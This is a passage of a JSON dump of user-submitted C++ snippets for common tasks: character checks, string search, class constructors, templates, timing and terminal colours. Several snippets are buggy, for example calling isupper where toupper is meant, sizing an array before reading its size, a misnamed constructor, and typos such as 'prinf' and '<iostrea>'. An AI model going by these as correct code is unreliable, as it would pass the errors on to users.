    "description": "char choice;  // it will instantly transform it to upper case without the need // to convert it to int first choice = (char)toupper(choice); \nstr[i] = toupper(str[i]);\ntransform(str.begin(), str.end(), str.begin(), ::toupper); \n#include <iostream> #include <string> using namespace std;  int main() {     char letter;      cout << \"You will be asked to enter a character.\";     cout << \"\\nIf it is a lowercase character, it will be converted to uppercase.\";     cout << \"\\n\\nEnter a character. Press . to stop: \";      cin >> letter;      if(islower(letter))     {         letter = isupper(letter);         cout << letter;     }      while(letter != '.')     {         cout << \"\\n\\nEnter a character. Press . to stop: \";         cin >> letter;          if(islower(letter))         {             letter = toupper(letter);             cout << letter;         }     }      return 0; } \nint result = toupper(charecterVariable);// return the int that corresponding upper case char //if there is none then it will return the int for the original input. //can convert int to char after char result2 = (char)toupper(variableChar);\n",
    "reg_date": "2021-10-12T11:37:43.000Z"
  },
  {
    "id": 736,
    "keyword": null,
    "link": null,
    "title": " c++ cheat sheet",
    "description": "x=y;                        // Every expression is a statement int x;                      // Declarations are statements ;                           // Empty statement {                           // A block is a single statement     int x;                  // Scope of x is from declaration to end of block } if (x) a;                   // If x is true (not 0), evaluate a else if (y) b;              // If not x and y (optional, may be repeated) else c;                     // If not x and not y (optional)  while (x) a;                // Repeat 0 or more times while x is true  for (x; y; z) a;            // Equivalent to: x; while(y) {a; z;}  for (x : y) a;              // Range-based for loop e.g.                             // for (auto& x in someList) x.y();  do a; while (x);            // Equivalent to: a; while(x) a;  switch (x) {                // x must be int     case X1: a;             // If x == X1 (must be a const), jump here     case X2: b;             // Else if x == X2, jump here     default: c;             // Else jump here (optional) } break;                      // Jump out of while, do, or for loop, or switch continue;                   // Jump to bottom of while, do, or for loop return x;                   // Return x from function to caller try { a; } catch (T t) { b; }          // If a throws a T, then jump here catch (...) { c; }          // If a throws something else, jump here\n255, 0377, 0xff             // Integers (decimal, octal, hex) 2147483647L, 0x7fffffffl    // Long (32-bit) integers 123.0, 1.23e2               // double (real) numbers 'a', '\\141', '\\x61'         // Character (literal, octal, hex) '\\n', '\\\\', '\\'', '\\\"'      // Newline, backslash, single quote, double quote \"string\\n\"                  // Array of characters ending with newline and \\0 \"hello\" \"world\"             // Concatenated strings true, false                 // bool constants 1 and 0 nullptr                     // Pointer type with the address of 0\n                            // Comment to end of line                             /* Multi-line comment */ #include  <stdio.h>         // Insert standard header file #include \"myfile.h\"         // Insert file in current directory #define X some text         // Replace X with some text #define F(a,b) a+b          // Replace F(1,2) with 1+2 #define X \\  some text                  // Multiline definition #undef X                    // Remove definition #if defined(X)              // Conditional compilation (#ifdef X) #else                       // Optional (#ifndef X or #if !defined(X)) #endif                      // Required after #if, #ifdef\n",
    "reg_date": "2021-10-12T11:37:43.000Z"
  },
  {
    "id": 737,
    "keyword": null,
    "link": null,
    "title": " c++ check explicit return",
    "description": "#pragma GCC diagnostic error \"-Wreturn-type\"\n",
    "reg_date": "2021-10-12T11:37:43.000Z"
  },
  {
    "id": 738,
    "keyword": null,
    "link": null,
    "title": " c++ check function return value",
    "description": "#pragma GCC diagnostic error \"-Wreturn-type\"\n",
    "reg_date": "2021-10-12T11:37:44.000Z"
  },
  {
    "id": 739,
    "keyword": null,
    "link": null,
    "title": " c++ check function with no return value",
    "description": "#pragma GCC diagnostic error \"-Wreturn-type\"\n",
    "reg_date": "2021-10-12T11:37:44.000Z"
  },
  {
    "id": 740,
    "keyword": null,
    "link": null,
    "title": " c++ check if char is number",
    "description": "char c = '1'; bool result = isdigit(c); cout << result << endl; //1\n#include<stdio.h> #include<ctype.h>  int main() {    char val1 = 's';    char val2 = '8';     if(isdigit(val1))    printf(\"The character is a digit\\n\");    else    printf(\"The character is not a digit\\n\");     if(isdigit(val2))    printf(\"The character is a digit\\n\");    else    printf(\"The character is not a digit\");     return 0; }\n",
    "reg_date": "2021-10-12T11:37:44.000Z"
  },
  {
    "id": 741,
    "keyword": null,
    "link": null,
    "title": " c++ check if cin didn't get int",
    "description": "while (std::cout << \"Enter a number\" && !(std::cin >> num)) {     std::cin.clear(); //clear bad input flag     std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n'); //discard input     std::cout << \"Invalid input; please re-enter.\\n\"; } \n",
    "reg_date": "2021-10-12T11:37:44.000Z"
  },
  {
    "id": 742,
    "keyword": null,
    "link": null,
    "title": " c++ check if cin got the wrong type",
    "description": "while (std::cout << \"Enter a number\" && !(std::cin >> num)) {     std::cin.clear(); //clear bad input flag     std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n'); //discard input     std::cout << \"Invalid input; please re-enter.\\n\"; }\n",
    "reg_date": "2021-10-12T11:37:44.000Z"
  },
  {
    "id": 743,
    "keyword": null,
    "link": null,
    "title": " c++ check if debug or release visual studio",
    "description": "// visual studio c++ #if defined _DEBUG     //debug #else     //release #endif\n",
    "reg_date": "2021-10-12T11:37:44.000Z"
  },
  {
    "id": 744,
    "keyword": null,
    "link": null,
    "title": " c++ check if file exits",
    "description": "#include <sys/stat.h> #include <unistd.h> #include <string> #include <fstream>  inline bool exists_test0 (const std::string& name) {     ifstream f(name.c_str());     return f.good(); }  inline bool exists_test1 (const std::string& name) {     if (FILE *file = fopen(name.c_str(), \"r\")) {         fclose(file);         return true;     } else {         return false;     }    }  inline bool exists_test2 (const std::string& name) {     return ( access( name.c_str(), F_OK ) != -1 ); }  inline bool exists_test3 (const std::string& name) {   struct stat buffer;      return (stat (name.c_str(), &buffer) == 0);  } \n#include <fstream> #include<iostream> using namespace std; int main() {    /* try to open file to read */    ifstream ifile;    ifile.open(\"b.txt\");    if(ifile) {       cout<<\"file exists\";    } else {       cout<<\"file doesn't exist\";    } }\nMethod exists_test0 (ifstream): **0.485s** Method exists_test1 (FILE fopen): **0.302s** Method exists_test2 (posix access()): **0.202s** Method exists_test3 (posix stat()): **0.134s** \n",
    "reg_date": "2021-10-12T11:37:44.000Z"
  },
  {
    "id": 745,
    "keyword": null,
    "link": null,
    "title": " c++ check if number is even or odd",
    "description": "#include <iostream> using namespace std; int main() {    int num = 7;    if((num & 1) == 0)    cout<<num<<\" is even\";    else    cout<<num<<\" is odd\";    return 0; }\n",
    "reg_date": "2021-10-12T11:37:44.000Z"
  },
  {
    "id": 746,
    "keyword": null,
    "link": null,
    "title": " c++ check if odd or even",
    "description": "#include <iostream> using namespace std;  int main() {   int n;    cout << \"Enter an integer: \";   cin >> n;        (n % 2 == 0) ? cout << n << \" is even.\" :  cout << n << \" is odd.\";        return 0; }\n",
    "reg_date": "2021-10-12T11:37:44.000Z"
  },
  {
    "id": 747,
    "keyword": null,
    "link": null,
    "title": " c++ check if string contains non alphanumeric",
    "description": "#include <algorithm>  any_of(str.begin(), str.end(), [](const char& c) -> bool { return !isalnum(c); });\n",
    "reg_date": "2021-10-12T11:37:44.000Z"
  },
  {
    "id": 748,
    "keyword": null,
    "link": null,
    "title": " c++ check if string contains substring",
    "description": "string str (\"There are two needles in this haystack.\"); string str2 (\"needle\");  if (str.find(str2) != string::npos) { //.. found. }  \nif (s1.find(s2) != std::string::npos) {     std::cout << \"found!\" << '\\n'; }\n",
    "reg_date": "2021-10-12T11:37:45.000Z"
  },
  {
    "id": 749,
    "keyword": null,
    "link": null,
    "title": " c++ check if string contains uppercase",
    "description": "#include <algorithm>  any_of(str.begin(), str.end(), isupper)\nif (isupper(str[i])) { \t// str[i] is uppercase }\n",
    "reg_date": "2021-10-12T11:37:45.000Z"
  },
  {
    "id": 750,
    "keyword": null,
    "link": null,
    "title": " c++ check if string is empty",
    "description": "#include <iostream>  int main() {   \tstd::string str;      \tif(str.empty()) std::cout << \"Empty\";    \treturn 0;  }\n",
    "reg_date": "2021-10-12T11:37:45.000Z"
  },
  {
    "id": 751,
    "keyword": null,
    "link": null,
    "title": " c++ check if string is integer",
    "description": "using namespace std;  bool isNumber(const string& s) {    \tstring::const_iterator it = s.begin();     while (it != s.end() && isdigit(*it)) ++it;     return !s.empty() && it == s.end(); }\nnum = input(\"Enter your number \")  print(\"\\n\") if num.isdigit():     print(\"User input is Number \") else:     print(\"User input is string \")\n",
    "reg_date": "2021-10-12T11:37:45.000Z"
  },
  {
    "id": 752,
    "keyword": null,
    "link": null,
    "title": " c++ check if vector is sorted",
    "description": "for(int i = 0; i < n.size()-1; i++)         if(n[i] > n[i+1])             return false;     return true;\n",
    "reg_date": "2021-10-12T11:37:45.000Z"
  },
  {
    "id": 753,
    "keyword": null,
    "link": null,
    "title": " c++ check missing return",
    "description": "#pragma GCC diagnostic error \"-Wreturn-type\"\n",
    "reg_date": "2021-10-12T11:37:45.000Z"
  },
  {
    "id": 754,
    "keyword": null,
    "link": null,
    "title": " c++ check prime",
    "description": "#include <bits/stdc++.h>  using namespace std;  int main() {     int prime;     cin >> prime; // input should be greater then 0     bool is_prime = true;      for (int i = 2; i * i <= prime; i++)     {         if (prime % i == 0)         {             is_prime = false;             break;         }     }      if (is_prime)     {         cout << \"Prime number\" << endl;     }     else     {         cout << \"Not Prime number\" << endl;     }     return 0; }\n",
    "reg_date": "2021-10-12T11:37:45.000Z"
  },
  {
    "id": 755,
    "keyword": null,
    "link": null,
    "title": " c++ check source code function return",
    "description": "#pragma GCC diagnostic error \"-Wreturn-type\"\n",
    "reg_date": "2021-10-12T11:37:45.000Z"
  },
  {
    "id": 756,
    "keyword": null,
    "link": null,
    "title": " c++ check substring",
    "description": "if (string1.find(string2) != std::string::npos) {     std::cout << \"found!\" << '\\n'; }\nif (s1.find(s2) != std::string::npos) {     std::cout << \"found!\" << '\\n'; }\n",
    "reg_date": "2021-10-12T11:37:45.000Z"
  },
  {
    "id": 757,
    "keyword": null,
    "link": null,
    "title": " c++ check that const char* has suffix",
    "description": "#include <boost/algorithm/string/predicate.hpp>  // works with const char*  assert(boost::algorithm::ends_with(\"mystring\", \"ing\"));  // also works with std::string std::string haystack(\"mystring\"); std::string needle(\"ing\"); assert(boost::algorithm::ends_with(haystack, needle));  std::string haystack2(\"ng\"); assert(! boost::algorithm::ends_with(haystack2, needle)); \n",
    "reg_date": "2021-10-12T11:37:45.000Z"
  },
  {
    "id": 758,
    "keyword": null,
    "link": null,
    "title": " c++ chrono",
    "description": "std::chrono::steady_clock::time_point begin = std::chrono::steady_clock::now(); //other stuff std::chrono::steady_clock::time_point end = std::chrono::steady_clock::now(); std::chrono::duration_cast<std::chrono::microseconds>(end - begin).count()  //time difference in microseconds\n",
    "reg_date": "2021-10-12T11:37:46.000Z"
  },
  {
    "id": 759,
    "keyword": null,
    "link": null,
    "title": " c++ chrono get milliseconds",
    "description": "#include <chrono>  uint32_t GetMillis() { \tusing namespace std::chrono; \treturn static_cast<uint32_t>(duration_cast<milliseconds>( \t\tsystem_clock::now().time_since_epoch()).count()); }\n",
    "reg_date": "2021-10-12T11:37:46.000Z"
  },
  {
    "id": 760,
    "keyword": null,
    "link": null,
    "title": " c++ cin operator",
    "description": "// cin with strings #include <iostream> #include <string> using namespace std;  int main () {   string mystr;   cout << \"What's your name? \";   getline (cin, mystr);   cout << \"Hello \" << mystr << \".\\n\";   cout << \"What is your favorite team? \";   getline (cin, mystr);   cout << \"I like \" << mystr << \" too!\\n\";   return 0; }\nint age; cin >> age;\n//Akbarali saqlagan C++ bo'yicha cin operatoriga ta'rif #include <iostream> using namespace std; int main (){   int a;   cout << \"Kattaroq sonni yozing: \";   cin >> a;   int b;   cout << \"Tepadaginga nisbatan kichik bo`lgan son(qiymatni) yozing: \";   cin >> b;   cout << \"Birinchi kiritgan soningizdan ikkinchi kiitgan soningiz \" << a-b << \" marta katta ekanligi ma'lum bo'ldi.\\n\";   return 0; }\n  int i;   cout << \"Please enter an integer value: \";   cin >> i;\ncin >> varName;\n",
    "reg_date": "2021-10-12T11:37:46.000Z"
  },
  {
    "id": 761,
    "keyword": null,
    "link": null,
    "title": " c++ clas deconstructor",
    "description": "class Line {    public:       Line();   // This is the constructor declaration       ~Line();  // This is the destructor: declaration };\n",
    "reg_date": "2021-10-12T11:37:46.000Z"
  },
  {
    "id": 762,
    "keyword": null,
    "link": null,
    "title": " c++ class constructor",
    "description": "class MyClass {     // The class   public:           // Access specifier     MyClass() {     // Constructor       cout << \"Hello World!\";     } };\nclass MyClass {    public:       MyClass();  // This is the constructor    private:       int someInt; };  MyClass::MyClass(void) {    someInt = 1; }\nLine::Line( double len): length(len) {    cout << \"Object is being created, length = \" << len << endl; } \nclass Book {public:    Book(const char*);    ~Book();    void display();private:    char* name;};\nstruct S {     int n;     S(int); // constructor declaration     S() : n(7) {} // constructor definition.                   // \": n(7)\" is the initializer list                   // \": n(7) {}\" is the function body }; S::S(int x) : n{x} {} // constructor definition. \": n{x}\" is the initializer list int main() {     S s; // calls S::S()     S s2(10); // calls S::S(int) }\n",
    "reg_date": "2021-10-12T11:37:46.000Z"
  },
  {
    "id": 763,
    "keyword": null,
    "link": null,
    "title": " c++ class constructor variable arguments",
    "description": "struct A {      template<typename ... Args>      A(const char * fmt, Args&& ... args) {           printf(fmt,std::forward<Args>(args) ...);      }; };  struct B: public A {   template<typename ... Args>   B(const char * fmt, Args&& ... args) : A(fmt, std::forward<Args>(args) ...) {} }; \n",
    "reg_date": "2021-10-12T11:37:46.000Z"
  },
  {
    "id": 764,
    "keyword": null,
    "link": null,
    "title": " c++ class member initialization",
    "description": "class Test  { private:   std::string data; public:   test(std::string data) : data(data) {}   std::string getData() {     return data;   } };  int main() {   Test test(\"This is just some random Text\");   std::cout << test.getData() << std::endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:37:46.000Z"
  },
  {
    "id": 765,
    "keyword": null,
    "link": null,
    "title": " c++ class member initializer list",
    "description": "#include <iostream> class Entity { private :  \tstd::string m_Name; \tint m_Score; \tint x, y, z; public: \tEntity() \t\t:m_Name(\"[Unknown]\"),m_Score(0),x(0),y(0),z(0)//initialize in the order of how var are declared \t{ \t} \tEntity (const std::string& name)  \t\t:m_Name(name) \t{} \tconst std::string& GetName() const { return m_Name; }; }; int main() { \tEntity e1; \tstd::cout << e1.GetName() << std::endl; \tEntity e2(\"Caleb\"); \tstd::cout << e2.GetName() << std::endl; \tstd::cin.get(); }\n",
    "reg_date": "2021-10-12T11:37:46.000Z"
  },
  {
    "id": 766,
    "keyword": null,
    "link": null,
    "title": " c++ class method example",
    "description": "class Object { public: \tint var; \tvoid setVar(int n) { \t\tvar = n; \t} \tint getNum() { \t\treturn var; \t} };  int main() { \tObject obj; \tobj.setVar(13); \tstd::cout << obj.getNum() << std::endl; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:37:46.000Z"
  },
  {
    "id": 767,
    "keyword": null,
    "link": null,
    "title": " c++ class template",
    "description": "template <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }\ntemplate <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }  void main() {   int a = 6;   int b = 42;   swap<int>(a, b);   printf(\"a=%d, b=%d\\n\", a, b);      // Implicit template parameter deduction   double f = 5.5;   double g = 42.0;   swap(f, g);   printf(\"f=%f, g=%f\\n\", f, g); }  /* Output: a=42, b=6 f=42.0, g=5.5 */\n// function template #include <iostream> using namespace std;  template <class T> T GetMax (T a, T b) {   T result;   result = (a>b)? a : b;   return (result); }  int main () {   int i=5, j=6, k;   long l=10, m=5, n;   k=GetMax<int>(i,j);   n=GetMax<long>(l,m);   cout << k << endl;   cout << n << endl;   return 0; }\n#include <vector>  // This is your own template // T it's just a type template <class T1, class T2, typename T3, typename T4 = int> class MyClass {   public:   \tMyClass() { }      private:   \tT1 data; \t\t// For example this data variable is T type   \tT2 anotherData;\t// Actually you can name it as you wish but   \tT3 variable;\t// for convenience you should name it T }  int main(int argc, char **argv) {   std::vector<int> array(10);   //          ^^^   // This is a template in std library      MyClass<int> object();   // This is how it works with your class, just a template for type   // < > angle brackets means \"choose\" any type you want   // But it isn't necessary should work, because of some reasons   // For example you need a type that do not supporting with class   return (0); }\ntemplate <class myType> myType GetMax (myType a, myType b) {  return (a>b?a:b); }\n",
    "reg_date": "2021-10-12T11:37:46.000Z"
  },
  {
    "id": 768,
    "keyword": null,
    "link": null,
    "title": " c++ classes",
    "description": "class SampleClass {     int a; public:     SampleClass(int v)     {         a=v;     }     int RetVal()     {         return a;     } };\n   class MyClass {          // The class   public:                // Access specifier     int myNum;        //    Attribute (int variable)     string myString;  //    Attribute (string variable) };    \n",
    "reg_date": "2021-10-12T11:37:47.000Z"
  },
  {
    "id": 769,
    "keyword": null,
    "link": null,
    "title": " c++ clear char array",
    "description": "for ( int i = 0; i < sizeof(message);  i++ ) {     message[i] = (char)0; }\n",
    "reg_date": "2021-10-12T11:37:47.000Z"
  },
  {
    "id": 770,
    "keyword": null,
    "link": null,
    "title": " c++ clear console",
    "description": "#include <Windows.h>  int main() { \t//print stuff      \tsystem(\"cls\"); // clear console }\nsystem (\"CLS\");\n#ifdef __cplusplus__   #include <cstdlib> #else   #include <stdlib.h> #endif  if (system(\"CLS\")) system(\"clear\");\ni swear if you write system(\"cls\"); one more time you're ugly\n",
    "reg_date": "2021-10-12T11:37:47.000Z"
  },
  {
    "id": 771,
    "keyword": null,
    "link": null,
    "title": " c++ clear stream",
    "description": "// EXAMPLE ostringstream osTest; osTest << \"This is the stream\\n\"; osTest.clear(); osTest.str(\"\");  /* SYNTAX  <your-stream-variable>.clear(); <your-stream-variable>.empty(); */  /* HEADER(S)  #include <sstream> */\n",
    "reg_date": "2021-10-12T11:37:47.000Z"
  },
  {
    "id": 772,
    "keyword": null,
    "link": null,
    "title": " c++ cli convert string to string^",
    "description": "string str = \"Here\"; String^ Str = gcnew String(str.c_str()); \n",
    "reg_date": "2021-10-12T11:37:47.000Z"
  },
  {
    "id": 773,
    "keyword": null,
    "link": null,
    "title": " c++ client service ros",
    "description": "#include \"ros/ros.h\" #include \"beginner_tutorials/AddTwoInts.h\" #include <cstdlib>  int main(int argc, char **argv) {   ros::init(argc, argv, \"add_two_ints_client\");   if (argc != 3)   {     ROS_INFO(\"usage: add_two_ints_client X Y\");     return 1;   }    ros::NodeHandle n;   ros::ServiceClient client = n.serviceClient<beginner_tutorials::AddTwoInts>(\"add_two_ints\");   beginner_tutorials::AddTwoInts srv;   srv.request.a = atoll(argv[1]);   srv.request.b = atoll(argv[2]);   if (client.call(srv))   {     ROS_INFO(\"Sum: %ld\", (long int)srv.response.sum);   }   else   {     ROS_ERROR(\"Failed to call service add_two_ints\");     return 1;   }    return 0; } \n",
    "reg_date": "2021-10-12T11:37:47.000Z"
  },
  {
    "id": 774,
    "keyword": null,
    "link": null,
    "title": " c++ clip values",
    "description": "template <typename T> T clip(const T& n, const T& lower, const T& upper) {   return std::max(lower, std::min(n, upper)); }  // Credit: https://stackoverflow.com/questions/9323903/most-efficient-elegant-way-to-clip-a-number\n",
    "reg_date": "2021-10-12T11:37:47.000Z"
  },
  {
    "id": 775,
    "keyword": null,
    "link": null,
    "title": " c++ cmd program run in background",
    "description": "#include <windows.h>   #include <iostream>      using namespace std;   int main () {        cout<<\"Some  information is displayed.. \\n\\n\";     Sleep(5000);      cout<<\"wait.. the console is going to hide and run in background.. \\n\";     Sleep(5000);      ShowWindow(FindWindowA(\"ConsoleWindowClass\", NULL), false);      while(true) {                  // Do your hidden stuff in here     }    return 0; } \nHWND window; AllocConsole(); window = FindWindowA(\"ConsoleWindowClass\", NULL); ShowWindow(window,0);\n",
    "reg_date": "2021-10-12T11:37:47.000Z"
  },
  {
    "id": 776,
    "keyword": null,
    "link": null,
    "title": " c++ code",
    "description": "#include <iostream> #include<conio.h> /* For getch() only */ using namespace std; int main () {    int num = 10;             if (num % 2 == 0)             {                 cout<<\"It is an even number\";             } getch();  /* getch is the function of conio.h */ }\nhelp me i dont now what the freak am doing any more\n// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n#include <bits/stdc++.h> using namespace std;  long int getSumOfFactors(int n) {     long int temp = 0;     for (int i=1;i<=n;i++){         if (n%i==0) temp = temp+i;     }     return temp; }  int main() {     int n;      cout<<\"Input the number : \";     cin>>n;      long int result = getSumOfFactors(n);      cout<<\"\\nThe Summation of the all the factors of the number is : \"<<result;  }\n#include<bits/stdc++.h> using namespace std; int main () {   string s1, s2;   cin >> s1 >> s2;   cout << s1.size () << \" \" << s2.size () << endl;   cout << s1 << s2 << endl;   char temp;   temp = s1[0];   s1[0] = s2[0];   s2[0] = temp;   cout << s1 << \" \" << s2 << endl; }\n#include <iostrea>\n",
    "reg_date": "2021-10-12T11:37:47.000Z"
  },
  {
    "id": 777,
    "keyword": null,
    "link": null,
    "title": " c++ code 2d block",
    "description": "for(size_t bx = 0; bx < width;  bx += block_width) for(size_t by = 0; by < height; by += block_height) {   float sum = 0;   for(size_t x = 0; x < block_width; ++x)   for(size_t y = 0; y < block_height; ++y) {     sum += array[bx + x][by + y];   }   average = sum / (block_width * block_height);   new_array[bx][by] = average; }\n",
    "reg_date": "2021-10-12T11:37:47.000Z"
  },
  {
    "id": 778,
    "keyword": null,
    "link": null,
    "title": " c++ code executio canntot proceed because glew32.dll was not founud",
    "description": "You may have to put the \"glew32.dll\" file in the \"C:\\Windows\\System32 folder.\"  If you wonder about \"what if i want to release\" just add the file into the users pc by adding a install script i.e. batch that copies the file.\n",
    "reg_date": "2021-10-12T11:37:48.000Z"
  },
  {
    "id": 779,
    "keyword": null,
    "link": null,
    "title": " c++ code for electricity billing system",
    "description": "int units;\n",
    "reg_date": "2021-10-12T11:37:48.000Z"
  },
  {
    "id": 780,
    "keyword": null,
    "link": null,
    "title": " c++ code for leap year",
    "description": "#include <iostream> using namespace std;  int main() {     int year;      cout << \"Enter a year: \";     cin >> year;      if (year % 4 == 0) {         if (year % 100 == 0) {             if (year % 400 == 0)                 cout << year << \" is a leap year.\";             else                 cout << year << \" is not a leap year.\";         }         else             cout << year << \" is a leap year.\";     }     else         cout << year << \" is not a leap year.\";      return 0; }\n",
    "reg_date": "2021-10-12T11:37:48.000Z"
  },
  {
    "id": 781,
    "keyword": null,
    "link": null,
    "title": " c++ code to print hello world",
    "description": "#include<iostream> using namespace std;  int main(){     cout << \"Hello World\" << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:37:48.000Z"
  },
  {
    "id": 782,
    "keyword": null,
    "link": null,
    "title": " c++ code to write 2d array",
    "description": "#include <iostream> using namespace std; int main(){ \tint n,m; \tint a[n][m]; \tcin >> n >>m; \tfor ( int i=0; i<n; i++){ \t\tfor (int j=0; j<m; j++){ \t\t\tcin >> a[i][j]; \t\t} \t} \t \tfor ( int x=0; x<n; x++){ \t\tfor (int y=0; y<m; y++){ \t\t\tcout << \"a[\" << x << \"][\" << y << \"]: \"; \t\t\tcout << a[x][y] << endl; \t\t} \t} \treturn 0; }\n",
    "reg_date": "2021-10-12T11:37:48.000Z"
  },
  {
    "id": 783,
    "keyword": null,
    "link": null,
    "title": " c++ coding structure",
    "description": "#include <iostream> using namespace std;  int main() {   cout << \"Hello World!\" << endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:37:48.000Z"
  },
  {
    "id": 784,
    "keyword": null,
    "link": null,
    "title": " c++ colored output",
    "description": "#include <stdio.h>    // [0;31m\tRed // [1;31m\tBold Red // [0;32m\tGreen // [1;32m\tBold Green // [0;33m\tYellow // [01;33m\tBold Yellow // [0;34m\tBlue // [1;34m\tBold Blue // [0;35m\tMagenta // [1;35m\tBold Magenta // [0;36m\tCyan // [1;36m\tBold Cyan // [0m\tReset     int main () {   printf(\"\\033[1;31m\");   printf(\"Hello world\\n\");   printf(\"\\033[0m;\")   return 0; } \n//the following are UBUNTU/LINUX, and MacOS ONLY terminal color codes. #define RESET   \"\\033[0m\" #define BLACK   \"\\033[30m\"      /* Black */ #define RED     \"\\033[31m\"      /* Red */ #define GREEN   \"\\033[32m\"      /* Green */ #define YELLOW  \"\\033[33m\"      /* Yellow */ #define BLUE    \"\\033[34m\"      /* Blue */ #define MAGENTA \"\\033[35m\"      /* Magenta */ #define CYAN    \"\\033[36m\"      /* Cyan */ #define WHITE   \"\\033[37m\"      /* White */ #define BOLDBLACK   \"\\033[1m\\033[30m\"      /* Bold Black */ #define BOLDRED     \"\\033[1m\\033[31m\"      /* Bold Red */ #define BOLDGREEN   \"\\033[1m\\033[32m\"      /* Bold Green */ #define BOLDYELLOW  \"\\033[1m\\033[33m\"      /* Bold Yellow */ #define BOLDBLUE    \"\\033[1m\\033[34m\"      /* Bold Blue */ #define BOLDMAGENTA \"\\033[1m\\033[35m\"      /* Bold Magenta */ #define BOLDCYAN    \"\\033[1m\\033[36m\"      /* Bold Cyan */ #define BOLDWHITE   \"\\033[1m\\033[37m\"      /* Bold White */\n#define RESET   \"\\033[0m\" #define BLACK   \"\\033[30m\"      /* Black */ #define RED     \"\\033[31m\"      /* Red */ #define GREEN   \"\\033[32m\"      /* Green */ #define YELLOW  \"\\033[33m\"      /* Yellow */ #define BLUE    \"\\033[34m\"      /* Blue */ #define MAGENTA \"\\033[35m\"      /* Magenta */ #define CYAN    \"\\033[36m\"      /* Cyan */ #define WHITE   \"\\033[37m\"      /* White */ #define BOLDBLACK   \"\\033[1m\\033[30m\"      /* Bold Black */\n// For windows only #include <Windows.h>  std::string textColor(int colorID = 1, std::string textToColor = \"\") { \t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), colorID); \t\treturn textToColor; }  // Usage: std::cout << textColor(1, \"example\");  // Color ID's /* 1: Blue 2: Green 3: Cyan 4: Red 5: Purple 6: Dark Yellow 7: White 8: Grey 9: Bright blue 10: Brigth green 11: Bright cyan 12: Bright red 13: Pink 14: Yellow 15: Bright white *\\\n    Black \\033[0;30m      Red \\033[0;31m      Green \\033[0;32m      Yellow \\033[0;33m      Blue \\033[0;34m      Purple \\033[0;35m      Cyan \\033[0;36m      White \\033[0;37m\n",
    "reg_date": "2021-10-12T11:37:48.000Z"
  },
  {
    "id": 785,
    "keyword": null,
    "link": null,
    "title": " c++ com port list",
    "description": "#include <iostream> #include <string> #include <Windows.h>  bool SelectComPort() //added function to find the present serial  {     char lpTargetPath[5000]; // buffer to store the path of the COMPORTS     bool gotPort = false; // in case the port is not found      for (int i = 0; i < 255; i++) // checking ports from COM0 to COM255     {         std::string str = \"COM\" + std::to_string(i); // converting to COM0, COM1, COM2         DWORD test = QueryDosDevice(str.c_str(), lpTargetPath, 5000);          // Test the return value and error if any         if (test != 0) //QueryDosDevice returns zero if it didn't find an object         {             std::cout << str << \": \" << lpTargetPath << std::endl;             gotPort = true;         }          if (::GetLastError() == ERROR_INSUFFICIENT_BUFFER)         {         }     }      return gotPort; }\n",
    "reg_date": "2021-10-12T11:37:48.000Z"
  },
  {
    "id": 786,
    "keyword": null,
    "link": null,
    "title": " c++ comment",
    "description": "/* This is a comment */  /* C++ comments can also    * span multiple lines */  /* Meowwwwww */\n// This is a single one line comment  /* multiline comment */\n// Comment here /* \tComment     Here... */\n",
    "reg_date": "2021-10-12T11:37:48.000Z"
  },
  {
    "id": 787,
    "keyword": null,
    "link": null,
    "title": " c++ comment out multiple lines",
    "description": "/* This is a comment */  /* C++ comments can also    * span multiple lines */  /* Meowwwwww */\n// This is a single one line comment  /* multiline comment */\nCtrl+Shift+/\n",
    "reg_date": "2021-10-12T11:37:48.000Z"
  },
  {
    "id": 788,
    "keyword": null,
    "link": null,
    "title": " c++ compare",
    "description": "// comparing apples with apples #include <iostream> #include <string>  int main () {   std::string str1 (\"green apple\");   std::string str2 (\"red apple\");    if (str1.compare(str2) != 0)     std::cout << str1 << \" is not \" << str2 << '\\n';    if (str1.compare(6,5,\"apple\") == 0)     std::cout << \"still, \" << str1 << \" is an apple\\n\";    if (str2.compare(str2.size()-5,5,\"apple\") == 0)     std::cout << \"and \" << str2 << \" is also an apple\\n\";    if (str1.compare(6,5,str2,4,5) == 0)     std::cout << \"therefore, both are apples\\n\";    return 0; }\nc++ compare values \nint compare (const string& str) const; \n",
    "reg_date": "2021-10-12T11:37:48.000Z"
  },
  {
    "id": 789,
    "keyword": null,
    "link": null,
    "title": " c++ compare char",
    "description": " // syntax #include <cstring> // this needs to be at the top of the script/code std::strcmp(<1st-char>,<2nd-char>)    // example (assuming: char_1 = 'Compare me'; char_2 = 'Compare_me') #include <cstring> if (std::strcmp(char_1,char_2) == 0) {  std::cout << \"The char's that you compared match!\" << std::endl;  } else {  std::cout << \"The char's that you compared DON'T match\" << std::endl;  }  // OUTPUT: The char's that you compared match!  /* NOTE: the following outputs of std::strcmp indicate: [less than zero] : left-hand-side appears before right-hand-side in lexicographical order [zero] : the chars are equal [greater than zero] : left-hand-side appears after right-hand-side in lexicographical order */\n#include<stdio.h>  #include<string.h>    int main()  {              char char1[] = \"coucou\";      char char2[] = \"coucou\";           \tif( strcmp(char1, char2) == 0 )        printf(\"Strings are the same\");      \telse       prinf(\"Strings are differentes\");           return 0;  }\n#include <string.h> ... if (strcmp(firstSTR, secondSTR) == 0) {     // strings are equal     ... } else {     // strings are NOT equal }\n",
    "reg_date": "2021-10-12T11:37:49.000Z"
  },
  {
    "id": 790,
    "keyword": null,
    "link": null,
    "title": " c++ compare char array",
